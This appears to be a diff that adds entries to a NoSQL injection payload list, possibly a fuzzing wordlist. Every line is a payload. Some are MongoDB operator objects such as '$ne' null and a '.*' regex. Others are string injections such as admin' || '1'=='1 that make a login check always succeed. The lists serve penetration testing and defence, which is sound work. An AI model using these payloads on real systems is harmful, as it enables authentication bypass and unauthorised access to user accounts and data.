@@ -1,1 +1,6 @@
 {"$gt": ""}
+{"$ne": null}
+{"$regex": ".*"}
+admin' || '1'=='1
+admin' || true || '1'=='1
+this.password.match(/.*/)
